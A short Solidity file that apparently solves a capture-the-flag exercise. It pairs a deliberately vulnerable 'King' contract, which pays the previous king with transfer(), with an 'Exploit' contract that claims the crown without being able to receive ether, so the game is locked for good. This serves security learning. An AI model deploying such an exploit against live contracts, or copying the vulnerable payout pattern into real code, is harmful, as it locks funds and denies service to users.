// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Exploit {
    address public exploitAddr;

    constructor(address _exploit) {
        exploitAddr = _exploit;
    }

    function exploit() external payable {
        // 0.002 eth
        (bool result, ) = address(exploitAddr).call{value: msg.value}("");
        require(result);
    }
}
